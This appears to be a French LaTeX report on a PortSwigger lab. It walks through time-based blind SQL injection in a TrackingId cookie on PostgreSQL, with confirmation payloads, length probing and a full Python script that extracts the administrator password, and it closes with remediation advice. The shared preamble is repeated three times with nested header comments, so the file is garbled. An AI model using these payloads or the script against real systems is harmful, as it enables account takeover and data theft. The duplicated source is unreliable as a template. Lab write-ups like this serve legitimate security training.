% =====================================================================
%  Rapport de sécurité - Blind SQL injection (time-based)
%  Compilation : latexmk -pdf blind-sqli-time-delay.tex
% =====================================================================
\documentclass[11pt,a4paper]{article}
% =====================================================================
%  Préambule commun - Rapports de sécurité
%  Inclus par chaque rapport après \documentclass, avant \begin{document} :
%      \documentclass[11pt,a4paper]{article}
%      % =====================================================================
%  Préambule commun - Rapports de sécurité
%  Inclus par chaque rapport après \documentclass, avant \begin{document} :
%      \documentclass[11pt,a4paper]{article}
%      % =====================================================================
%  Préambule commun - Rapports de sécurité
%  Inclus par chaque rapport après \documentclass, avant \begin{document} :
%      \documentclass[11pt,a4paper]{article}
%      \input{../../templates/preambule.tex}
%      \begin{document} ... \end{document}
%
%  Moteur : pdflatex (compiler deux fois pour la table des matières, ou
%  utiliser latexmk -pdf).
% =====================================================================

\usepackage[T1]{fontenc}
\usepackage[utf8]{inputenc}
\usepackage{lmodern}
\usepackage[french]{babel}
\usepackage{csquotes}
\frenchsetup{StandardItemLabels=true}
\usepackage{amsmath}

\usepackage[margin=2.5cm]{geometry}
\usepackage{graphicx}
\usepackage{float}
\usepackage{xcolor}
\usepackage{array}
\usepackage{booktabs}
\usepackage{enumitem}
\usepackage{listings}
\usepackage{tcolorbox}
\tcbuselibrary{skins,breakable}
\usepackage[hidelinks]{hyperref}

% ---------------------------------------------------------------------
%  Palette
% ---------------------------------------------------------------------
\definecolor{codebg}{RGB}{245,246,248}
\definecolor{codeframe}{RGB}{210,214,220}
\definecolor{codekw}{RGB}{170,40,60}
\definecolor{codestr}{RGB}{30,110,70}
\definecolor{codecmt}{RGB}{120,125,135}
\definecolor{accent}{RGB}{30,70,120}
\definecolor{warnbg}{RGB}{255,247,230}
\definecolor{warnframe}{RGB}{224,168,64}
\definecolor{keybg}{RGB}{235,240,248}
\definecolor{keyframe}{RGB}{120,150,190}

% ---------------------------------------------------------------------
%  Listings (blocs de code encadrés, monospace)
% ---------------------------------------------------------------------
\lstdefinestyle{report}{
  backgroundcolor=\color{codebg},
  frame=single,
  rulecolor=\color{codeframe},
  basicstyle=\ttfamily\small,
  keywordstyle=\color{codekw}\bfseries,
  stringstyle=\color{codestr},
  commentstyle=\color{codecmt}\itshape,
  numbers=none,
  breaklines=true,
  breakatwhitespace=false,
  showstringspaces=false,
  columns=fullflexible,
  keepspaces=true,
  xleftmargin=8pt,
  xrightmargin=8pt,
  aboveskip=10pt,
  belowskip=10pt,
  literate=%
    {é}{{\'e}}1 {è}{{\`e}}1 {ê}{{\^e}}1 {à}{{\`a}}1 {ç}{{\c c}}1
    {É}{{\'E}}1 {î}{{\^i}}1 {ï}{{\"i}}1 {ô}{{\^o}}1 {û}{{\^u}}1
    {ù}{{\`u}}1 {œ}{{\oe}}1 {»}{{\guillemotright}}1 {«}{{\guillemotleft}}1
}
\lstset{style=report}

% ---------------------------------------------------------------------
%  Captures d'écran : image + légende en italique (sans « Figure N »)
%  \shot{fichier.png}{légende}
%  Si l'image manque, un cadre de remplacement est affiché.
% ---------------------------------------------------------------------
\newcommand{\shot}[2]{%
  \begin{center}%
    \IfFileExists{images/#1}%
      {\includegraphics[width=0.92\linewidth]{images/#1}}%
      {\setlength{\fboxsep}{0pt}\fcolorbox{codeframe}{codebg}{%
         \parbox[c][3.2cm][c]{0.92\linewidth}{\centering\ttfamily\small
         images/#1\\[4pt]\normalfont\itshape(capture à ajouter)}}}%
    \\[5pt]{\itshape\small #2}%
  \end{center}%
}

% ---------------------------------------------------------------------
%  Encadrés « points clés » (bleu) et « attention » (orange)
% ---------------------------------------------------------------------
\newtcolorbox{keybox}[1][]{
  breakable, colback=keybg, colframe=keyframe, boxrule=0.6pt,
  arc=2pt, left=8pt, right=8pt, top=6pt, bottom=6pt, #1}
\newtcolorbox{warnbox}[1][]{
  breakable, colback=warnbg, colframe=warnframe, boxrule=0.6pt,
  arc=2pt, left=8pt, right=8pt, top=6pt, bottom=6pt, #1}

\setlist[itemize]{leftmargin=1.4em, itemsep=2pt, topsep=4pt}

% ---------------------------------------------------------------------
%  Page de garde + table des matières
%  \makecover{titre}{sous-titre}{lignes méta}{auteur}{date}
%  Les lignes méta s'écrivent avec \metarow{Étiquette}{Valeur}.
% ---------------------------------------------------------------------
\newcommand{\metarow}[2]{\textbf{#1} & #2 \\}
\newcommand{\makecover}[5]{%
  \begin{titlepage}
    \centering
    \vspace*{1.2cm}
    {\large\scshape Rapport de sécurité}\par
    \vspace{1.6cm}
    {\huge\bfseries #1\par}
    \vspace{0.5cm}
    {\Large #2\par}
    \vspace{2.2cm}
    \begin{tcolorbox}[width=0.86\textwidth, colback=codebg,
        colframe=codeframe, boxrule=0.8pt, arc=3pt, left=12pt, right=12pt,
        top=10pt, bottom=10pt]
      \renewcommand{\arraystretch}{1.35}%
      \begin{tabular}{@{}r@{\hspace{1.2em}}p{0.62\textwidth}@{}}
        #3
      \end{tabular}
    \end{tcolorbox}
    \vfill
    {\large #4\par}
    \vspace{0.3cm}
    {#5\par}
  \end{titlepage}
  \tableofcontents
  \newpage
}

%      \begin{document} ... \end{document}
%
%  Moteur : pdflatex (compiler deux fois pour la table des matières, ou
%  utiliser latexmk -pdf).
% =====================================================================

\usepackage[T1]{fontenc}
\usepackage[utf8]{inputenc}
\usepackage{lmodern}
\usepackage[french]{babel}
\usepackage{csquotes}
\frenchsetup{StandardItemLabels=true}
\usepackage{amsmath}

\usepackage[margin=2.5cm]{geometry}
\usepackage{graphicx}
\usepackage{float}
\usepackage{xcolor}
\usepackage{array}
\usepackage{booktabs}
\usepackage{enumitem}
\usepackage{listings}
\usepackage{tcolorbox}
\tcbuselibrary{skins,breakable}
\usepackage[hidelinks]{hyperref}

% ---------------------------------------------------------------------
%  Palette
% ---------------------------------------------------------------------
\definecolor{codebg}{RGB}{245,246,248}
\definecolor{codeframe}{RGB}{210,214,220}
\definecolor{codekw}{RGB}{170,40,60}
\definecolor{codestr}{RGB}{30,110,70}
\definecolor{codecmt}{RGB}{120,125,135}
\definecolor{accent}{RGB}{30,70,120}
\definecolor{warnbg}{RGB}{255,247,230}
\definecolor{warnframe}{RGB}{224,168,64}
\definecolor{keybg}{RGB}{235,240,248}
\definecolor{keyframe}{RGB}{120,150,190}

% ---------------------------------------------------------------------
%  Listings (blocs de code encadrés, monospace)
% ---------------------------------------------------------------------
\lstdefinestyle{report}{
  backgroundcolor=\color{codebg},
  frame=single,
  rulecolor=\color{codeframe},
  basicstyle=\ttfamily\small,
  keywordstyle=\color{codekw}\bfseries,
  stringstyle=\color{codestr},
  commentstyle=\color{codecmt}\itshape,
  numbers=none,
  breaklines=true,
  breakatwhitespace=false,
  showstringspaces=false,
  columns=fullflexible,
  keepspaces=true,
  xleftmargin=8pt,
  xrightmargin=8pt,
  aboveskip=10pt,
  belowskip=10pt,
  literate=%
    {é}{{\'e}}1 {è}{{\`e}}1 {ê}{{\^e}}1 {à}{{\`a}}1 {ç}{{\c c}}1
    {É}{{\'E}}1 {î}{{\^i}}1 {ï}{{\"i}}1 {ô}{{\^o}}1 {û}{{\^u}}1
    {ù}{{\`u}}1 {œ}{{\oe}}1 {»}{{\guillemotright}}1 {«}{{\guillemotleft}}1
}
\lstset{style=report}

% ---------------------------------------------------------------------
%  Captures d'écran : image + légende en italique (sans « Figure N »)
%  \shot{fichier.png}{légende}
%  Si l'image manque, un cadre de remplacement est affiché.
% ---------------------------------------------------------------------
\newcommand{\shot}[2]{%
  \begin{center}%
    \IfFileExists{images/#1}%
      {\includegraphics[width=0.92\linewidth]{images/#1}}%
      {\setlength{\fboxsep}{0pt}\fcolorbox{codeframe}{codebg}{%
         \parbox[c][3.2cm][c]{0.92\linewidth}{\centering\ttfamily\small
         images/#1\\[4pt]\normalfont\itshape(capture à ajouter)}}}%
    \\[5pt]{\itshape\small #2}%
  \end{center}%
}

% ---------------------------------------------------------------------
%  Encadrés « points clés » (bleu) et « attention » (orange)
% ---------------------------------------------------------------------
\newtcolorbox{keybox}[1][]{
  breakable, colback=keybg, colframe=keyframe, boxrule=0.6pt,
  arc=2pt, left=8pt, right=8pt, top=6pt, bottom=6pt, #1}
\newtcolorbox{warnbox}[1][]{
  breakable, colback=warnbg, colframe=warnframe, boxrule=0.6pt,
  arc=2pt, left=8pt, right=8pt, top=6pt, bottom=6pt, #1}

\setlist[itemize]{leftmargin=1.4em, itemsep=2pt, topsep=4pt}

% ---------------------------------------------------------------------
%  Page de garde + table des matières
%  \makecover{titre}{sous-titre}{lignes méta}{auteur}{date}
%  Les lignes méta s'écrivent avec \metarow{Étiquette}{Valeur}.
% ---------------------------------------------------------------------
\newcommand{\metarow}[2]{\textbf{#1} & #2 \\}
\newcommand{\makecover}[5]{%
  \begin{titlepage}
    \centering
    \vspace*{1.2cm}
    {\large\scshape Rapport de sécurité}\par
    \vspace{1.6cm}
    {\huge\bfseries #1\par}
    \vspace{0.5cm}
    {\Large #2\par}
    \vspace{2.2cm}
    \begin{tcolorbox}[width=0.86\textwidth, colback=codebg,
        colframe=codeframe, boxrule=0.8pt, arc=3pt, left=12pt, right=12pt,
        top=10pt, bottom=10pt]
      \renewcommand{\arraystretch}{1.35}%
      \begin{tabular}{@{}r@{\hspace{1.2em}}p{0.62\textwidth}@{}}
        #3
      \end{tabular}
    \end{tcolorbox}
    \vfill
    {\large #4\par}
    \vspace{0.3cm}
    {#5\par}
  \end{titlepage}
  \tableofcontents
  \newpage
}

%      \begin{document} ... \end{document}
%
%  Moteur : pdflatex (compiler deux fois pour la table des matières, ou
%  utiliser latexmk -pdf).
% =====================================================================

\usepackage[T1]{fontenc}
\usepackage[utf8]{inputenc}
\usepackage{lmodern}
\usepackage[french]{babel}
\usepackage{csquotes}
\frenchsetup{StandardItemLabels=true}
\usepackage{amsmath}

\usepackage[margin=2.5cm]{geometry}
\usepackage{graphicx}
\usepackage{float}
\usepackage{xcolor}
\usepackage{array}
\usepackage{booktabs}
\usepackage{enumitem}
\usepackage{listings}
\usepackage{tcolorbox}
\tcbuselibrary{skins,breakable}
\usepackage[hidelinks]{hyperref}

% ---------------------------------------------------------------------
%  Palette
% ---------------------------------------------------------------------
\definecolor{codebg}{RGB}{245,246,248}
\definecolor{codeframe}{RGB}{210,214,220}
\definecolor{codekw}{RGB}{170,40,60}
\definecolor{codestr}{RGB}{30,110,70}
\definecolor{codecmt}{RGB}{120,125,135}
\definecolor{accent}{RGB}{30,70,120}
\definecolor{warnbg}{RGB}{255,247,230}
\definecolor{warnframe}{RGB}{224,168,64}
\definecolor{keybg}{RGB}{235,240,248}
\definecolor{keyframe}{RGB}{120,150,190}

% ---------------------------------------------------------------------
%  Listings (blocs de code encadrés, monospace)
% ---------------------------------------------------------------------
\lstdefinestyle{report}{
  backgroundcolor=\color{codebg},
  frame=single,
  rulecolor=\color{codeframe},
  basicstyle=\ttfamily\small,
  keywordstyle=\color{codekw}\bfseries,
  stringstyle=\color{codestr},
  commentstyle=\color{codecmt}\itshape,
  numbers=none,
  breaklines=true,
  breakatwhitespace=false,
  showstringspaces=false,
  columns=fullflexible,
  keepspaces=true,
  xleftmargin=8pt,
  xrightmargin=8pt,
  aboveskip=10pt,
  belowskip=10pt,
  literate=%
    {é}{{\'e}}1 {è}{{\`e}}1 {ê}{{\^e}}1 {à}{{\`a}}1 {ç}{{\c c}}1
    {É}{{\'E}}1 {î}{{\^i}}1 {ï}{{\"i}}1 {ô}{{\^o}}1 {û}{{\^u}}1
    {ù}{{\`u}}1 {œ}{{\oe}}1 {»}{{\guillemotright}}1 {«}{{\guillemotleft}}1
}
\lstset{style=report}

% ---------------------------------------------------------------------
%  Captures d'écran : image + légende en italique (sans « Figure N »)
%  \shot{fichier.png}{légende}
%  Si l'image manque, un cadre de remplacement est affiché.
% ---------------------------------------------------------------------
\newcommand{\shot}[2]{%
  \begin{center}%
    \IfFileExists{images/#1}%
      {\includegraphics[width=0.92\linewidth]{images/#1}}%
      {\setlength{\fboxsep}{0pt}\fcolorbox{codeframe}{codebg}{%
         \parbox[c][3.2cm][c]{0.92\linewidth}{\centering\ttfamily\small
         images/#1\\[4pt]\normalfont\itshape(capture à ajouter)}}}%
    \\[5pt]{\itshape\small #2}%
  \end{center}%
}

% ---------------------------------------------------------------------
%  Encadrés « points clés » (bleu) et « attention » (orange)
% ---------------------------------------------------------------------
\newtcolorbox{keybox}[1][]{
  breakable, colback=keybg, colframe=keyframe, boxrule=0.6pt,
  arc=2pt, left=8pt, right=8pt, top=6pt, bottom=6pt, #1}
\newtcolorbox{warnbox}[1][]{
  breakable, colback=warnbg, colframe=warnframe, boxrule=0.6pt,
  arc=2pt, left=8pt, right=8pt, top=6pt, bottom=6pt, #1}

\setlist[itemize]{leftmargin=1.4em, itemsep=2pt, topsep=4pt}

% ---------------------------------------------------------------------
%  Page de garde + table des matières
%  \makecover{titre}{sous-titre}{lignes méta}{auteur}{date}
%  Les lignes méta s'écrivent avec \metarow{Étiquette}{Valeur}.
% ---------------------------------------------------------------------
\newcommand{\metarow}[2]{\textbf{#1} & #2 \\}
\newcommand{\makecover}[5]{%
  \begin{titlepage}
    \centering
    \vspace*{1.2cm}
    {\large\scshape Rapport de sécurité}\par
    \vspace{1.6cm}
    {\huge\bfseries #1\par}
    \vspace{0.5cm}
    {\Large #2\par}
    \vspace{2.2cm}
    \begin{tcolorbox}[width=0.86\textwidth, colback=codebg,
        colframe=codeframe, boxrule=0.8pt, arc=3pt, left=12pt, right=12pt,
        top=10pt, bottom=10pt]
      \renewcommand{\arraystretch}{1.35}%
      \begin{tabular}{@{}r@{\hspace{1.2em}}p{0.62\textwidth}@{}}
        #3
      \end{tabular}
    \end{tcolorbox}
    \vfill
    {\large #4\par}
    \vspace{0.3cm}
    {#5\par}
  \end{titlepage}
  \tableofcontents
  \newpage
}


\begin{document}

\makecover
  {Blind SQL injection (time-based)}
  {CWE-89 \textperiodcentered{} OWASP A03\string:2021}
  {
    \metarow{Lab}{Blind SQL injection with time delays and information retrieval}
    \metarow{Classe}{Injection SQL}
    \metarow{Difficulté}{Practitioner}
    \metarow{SGBD}{PostgreSQL}
    \metarow{Plateforme}{PortSwigger Web Security Academy}
  }
  {Lucas Fagioli}
  {3 juin 2026}

% =====================================================================
\section{Contexte}
% =====================================================================
L'application utilise un cookie de suivi \texttt{TrackingId} à des fins
d'analyse d'audience. La valeur de ce cookie est insérée telle quelle dans une
requête SQL exécutée côté serveur. Le résultat de la requête n'est jamais
renvoyé, et la page ne change pas selon que la requête réussit, échoue ou ne
retourne aucune ligne : l'injection est donc totalement en aveugle.

Comme la requête s'exécute de façon synchrone, on peut déclencher des délais
conditionnels avec la fonction \texttt{pg\_sleep} de PostgreSQL. La base
devient alors un oracle binaire : en mesurant le temps de réponse, on répond à
des questions par oui ou par non, et on exfiltre ainsi le mot de passe de
l'utilisateur \texttt{administrator} caractère par caractère.

\begin{itemize}
  \item \textbf{Point d'injection} : le cookie \texttt{TrackingId}.
  \item \textbf{Objectif} : récupérer le mot de passe de \texttt{administrator}, puis se connecter avec ce compte.
\end{itemize}

\subsection{Environnement}
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{@{}p{0.30\textwidth}p{0.62\textwidth}@{}}
  \textbf{Système}        & Windows 11 (WSL2 pour le script) \\
  \textbf{Outil principal}& Burp Suite Community Edition \\
  \textbf{Navigateur}     & Chromium intégré à Burp (Open Browser) \\
  \textbf{Cible}          & Instance de lab PortSwigger, URL éphémère \texttt{*.web-security-academy.net} \\
\end{tabular}

\shot{01-homepage.png}{Page d'accueil de l'application cible.}

% =====================================================================
\section{Reconnaissance}
% =====================================================================
Le point d'injection est repéré en observant le trafic dans Burp, onglet
\emph{Proxy} puis \emph{HTTP history}. La toute première requête \texttt{GET /}
ne porte aucun cookie : le serveur n'a pas encore posé de \texttt{TrackingId}.

\shot{02-initial-request-no-cookie.png}{Première requête, sans cookie de suivi.}

Après un rechargement de la page (F5), le navigateur renvoie le cookie qui
vient d'être posé. La nouvelle requête \texttt{GET /} contient désormais
l'en-tête :

\begin{lstlisting}
Cookie: TrackingId=8Yx3hPM9qwq1x5pI; session=ForYtv42qGk8YjQwSoISgLljjxDJAVnO
\end{lstlisting}

C'est la valeur de \texttt{TrackingId} qui sera détournée pour l'injection.

\shot{03-request-with-tracking-cookie.png}{Requête portant le cookie \texttt{TrackingId}.}

La requête est ensuite envoyée au \emph{Repeater} (clic droit, \emph{Send to
Repeater}) pour pouvoir modifier et rejouer le cookie à volonté.

% =====================================================================
\section{Exploitation}
% =====================================================================

\subsection{Confirmer l'injection par un délai}
Dans le \emph{Repeater}, la valeur du cookie est remplacée par une charge
utile qui ferme la chaîne SQL (\texttt{'}), enchaîne une seconde instruction
(\texttt{;}, encodée \texttt{\%3B}) et force un délai côté serveur :

\begin{lstlisting}
Cookie: TrackingId=x'%3BSELECT+pg_sleep(10)--; session=...
\end{lstlisting}

La réponse revient après une dizaine de secondes au lieu d'être immédiate, ce
qui prouve que la valeur du cookie est bien exécutée comme du SQL par
PostgreSQL. L'injection en aveugle par délai temporel est confirmée.

\shot{04-pg-sleep-delay-proof.png}{Délai d'environ 10 secondes provoqué par \texttt{pg\_sleep}.}

\subsection{Vérifier que l'utilisateur administrateur existe}
Une charge conditionnelle ne déclenche le délai que si une ligne dont
\texttt{username='administrator'} existe dans la table \texttt{users} :

\begin{lstlisting}
Cookie: TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')
+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--; session=...
\end{lstlisting}

La réponse met environ 10 secondes : l'utilisateur \texttt{administrator}
existe donc.

\shot{05-administrator-exists-delay.png}{Condition vraie, délai d'environ 10 secondes.}

Contre-épreuve : avec un nom inexistant (\texttt{username='test'}), la
condition est fausse, \texttt{pg\_sleep(0)} s'exécute et la réponse est
immédiate. Le contraste entre le cas vrai (lent) et le cas faux (rapide)
confirme que l'on maîtrise la logique de la requête.

\shot{06-control-test-instant.png}{Condition fausse, réponse immédiate (contre-épreuve).}

\subsection{Déterminer la longueur du mot de passe}
La longueur est trouvée par recherche dichotomique sur
\texttt{LENGTH(password)}. Test "supérieur à 20" :

\begin{lstlisting}
x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>20)
+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
\end{lstlisting}

La réponse est immédiate (environ 41 ms) : la condition est fausse, le mot de
passe fait donc 20 caractères ou moins.

\shot{07-password-length-gt20-false.png}{\texttt{LENGTH(password) > 20} est faux : réponse immédiate.}

Confirmation "égal à 20" :

\begin{lstlisting}
x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)=20)
+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
\end{lstlisting}

La réponse met environ 10 secondes : la longueur du mot de passe est
exactement de 20 caractères.

\shot{08-password-length-eq20-true.png}{\texttt{LENGTH(password) = 20} est vrai : délai d'environ 10 secondes.}

\subsection{Extraire le mot de passe caractère par caractère}
Pour chaque position i de 1 à 20, chaque caractère candidat c est testé.
Celui qui déclenche le délai (\texttt{pg\_sleep}) est le bon :

\begin{lstlisting}
...AND+SUBSTRING(password,i,1)='c'...      (delai si vrai)
\end{lstlisting}

Faire 20 positions fois une trentaine de caractères à la main n'est pas
réaliste : l'extraction est automatisée par un script Python qui mesure le
temps de réponse de chaque requête pour reconstituer le mot de passe.

\begin{lstlisting}[language=Python]
#!/usr/bin/env python3
"""
Extraction du mot de passe 'administrator' par injection SQL en aveugle (delai).
Lab PortSwigger : Blind SQL injection with time delays and information retrieval.
Point d'injection : cookie TrackingId (PostgreSQL).
"""
import requests
import string
import time
from urllib.parse import quote

URL = "https://<lab-id>.web-security-academy.net/"
CHARSET = string.ascii_lowercase + string.digits  # mots de passe PortSwigger : [a-z0-9]
LENGTH = 20        # longueur trouvee a l'etape precedente
SLEEP = 3          # delai (secondes) injecte via pg_sleep
THRESHOLD = 2.5    # seuil de detection du delai

password = ""
for pos in range(1, LENGTH + 1):
    for c in CHARSET:
        sql = (
            "x';SELECT CASE WHEN "
            f"(username='administrator' AND SUBSTRING(password,{pos},1)='{c}') "
            f"THEN pg_sleep({SLEEP}) ELSE pg_sleep(0) END FROM users--"
        )
        cookie = "TrackingId=" + quote(sql, safe="")
        t0 = time.time()
        requests.get(URL, headers={"Cookie": cookie})
        if time.time() - t0 > THRESHOLD:   # condition vraie : caractere trouve
            password += c
            print(f"[{pos:2d}/{LENGTH}] {password}")
            break

print("\n[+] Mot de passe administrator :", password)
\end{lstlisting}

Résultat :

\begin{lstlisting}
[+] Administrator password: f5wav4ixgrwzc5833mar
\end{lstlisting}

\shot{09-password-extracted.png}{Sortie du script : mot de passe reconstitué.}

\subsection{Résolution du lab}
Connexion sur \texttt{/login} avec les identifiants récupérés
(\texttt{administrator} / \texttt{f5wav4ixgrwzc5833mar}).

\shot{10-login-as-administrator.png}{Connexion en tant qu'administrateur.}

La connexion réussit et le lab affiche la bannière verte "Congratulations,
you solved the lab !", ce qui démontre la compromission du compte
\texttt{administrator}.

\shot{11-lab-solved.png}{Lab résolu, bannière verte.}

% =====================================================================
\section{Impact}
% =====================================================================
Bien que l'application ne renvoie ni donnée ni message d'erreur (l'injection
est entièrement en aveugle), la seule capacité à déclencher un délai
conditionnel suffit à transformer la base en oracle binaire et à exfiltrer
n'importe quelle information, un bit à la fois.

\begin{itemize}
  \item \textbf{Confidentialité} : le mot de passe de \texttt{administrator} a été extrait et le compte pris en main. La même technique permet de lire toute la table \texttt{users}, et plus généralement toute donnée accessible au compte de base de données de l'application (autres tables, métadonnées, version du SGBD).
  \item \textbf{Vecteur trivial} : l'attaque ne demande aucune authentification. Un simple cookie de suivi manipulable suffit.
  \item \textbf{Gravité} : élevée. Le point d'entrée est un champ analytique d'apparence anodine, ce qui le rend facile à manquer lors d'une revue.
\end{itemize}

Gravité indicative (aucune authentification, fort impact sur la
confidentialité) : plage "élevée", à ajuster selon l'étendue réelle de
la base et de ses privilèges.

% =====================================================================
\section{Remédiation}
% =====================================================================
La cause racine est la concaténation de la valeur du cookie dans la requête
SQL.

\begin{itemize}
  \item \textbf{Correctif principal} : utiliser des requêtes paramétrées (marqueurs liés) ou un ORM qui paramètre par défaut. La valeur ne doit jamais être interprétée comme du code. Avec une requête préparée, \texttt{x';SELECT pg\_sleep(10){-}{-}} n'est qu'une chaîne inerte comparée à une valeur.
  \item \textbf{Moindre privilège} : le compte PostgreSQL de l'application ne doit disposer que des accès strictement nécessaires, sans pouvoir lire \texttt{users} depuis le contexte analytique ni appeler de fonctions inutiles.
  \item \textbf{Validation des entrées} : un \texttt{TrackingId} a un format attendu (alphanumérique, longueur fixe). Tout ce qui ne correspond pas doit être rejeté.
  \item \textbf{Surveillance et journalisation} : ne pas exposer les erreurs SQL ; journaliser et alerter sur les requêtes anormales (temps d'exécution, motifs d'injection).
  \item Un pare-feu applicatif (WAF) peut servir de couche supplémentaire, jamais de remplacement du correctif applicatif.
\end{itemize}

\vspace{4pt}
\noindent\emph{Référence} : OWASP SQL Injection Prevention Cheat Sheet ; CWE-89.

\end{document}
